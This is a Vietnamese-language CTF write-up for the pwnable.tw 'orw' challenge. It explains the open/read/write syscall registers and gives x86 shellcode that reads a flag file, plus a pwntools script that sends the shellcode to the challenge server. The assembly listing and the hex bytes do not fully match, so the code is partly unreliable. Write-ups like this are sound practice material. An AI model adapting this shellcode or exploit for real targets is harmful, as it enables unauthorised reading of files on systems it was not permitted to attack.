# orw

### Hint

>Read the flag from /home/orw/flag.
>
>Only open read write syscall are allowed to use.

Oke giờ là việc viết shell code: [more](https://www.tutorialspoint.com/assembly_programming/assembly_file_management.htm)

### sys_open():

* eax = 0x5
* ebx: filename. Ta sẽ push tên file vào stack và gán ebx = esp
* ecx: access mode: read-only (0), write-only (1), read-write (2). Ta chỉ cần đọc file nên ecx = 0 là đủ
* edx: file permission. Ta không cần quan tâm, cho edx = 0
* sys_open() sẽ trả về file desciptor, lưu vào thanh ghi eax.

### sys_read():

* eax = 0x3
* ebx: file descriptor của file cần mở. Chính là giá trị trả về từ hàm sys_open() bên trên đã được lưu vào thanh ghi eax. Nên ebx = eax
* ecx: con trỏ trỏ đến thanh ghi chứa chuỗi đọc được. Ta chọn bừa 1 thanh ghi nào đó: ecx = esi
* edx: số byte đọc từ file. Cứ việc cho edx lớn: edx = 0x100
* sys_read() sẽ trả về số kí tự thật sự được đọc, lưu vào thanh ghi eax

### sys_write():

* eax = 0x4
* ebx: file descriptor. Ta cần ghi ra màn hình nên ebx = 0x1 (fd của stdout)
* ecx: con trỏ trỏ đến thanh ghi chứa chuỗi cần ghi. Lúc nãy ta đã lưu vào thanh ghi esi vậy nên ecx = esi
* edx: số byte cần ghi. Chính là giá trị trả về của sys_read(). edx = eax
* sys_write() sẽ trả về số kí tự thật sự được ghi.

```python
>>> import binascii
>>> binascii.hexlify(b'/home/orw/flag/\x00\x00'[::-1])
b'00002f67616c662f77726f2f656d6f682f'
```

### Shellcode

```python
push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f

mov ebx,esp
xor ecx,ecx
xor edx,edx
mov eax,0x05
int 0x80

mov ebx,eax
mov ecx,esi
mov edx,0x100
mov eax,0x03
int 0x80

mov ebx,0x1
mov ecx,esi
mov edx,eax
mov eax,0x04
int 0x80

```

### Exploit

```python
from pwn import *
r = remote("chall.pwnable.tw",10001)

shellcode = b"\x6A\x00\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x2F\x2F\x68\x31\xC9\x31\xC0\x89\xE3\xB8\x05\x00\x00\x00\xCD\x80\xB8\x03\x00\x00\x00\x89\xC3\x89\xE1\xBA\x40\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xCD\x80"

r.sendline(shellcode)
print(r.recvuntil(b"shellcode:"))
r.interactive()

```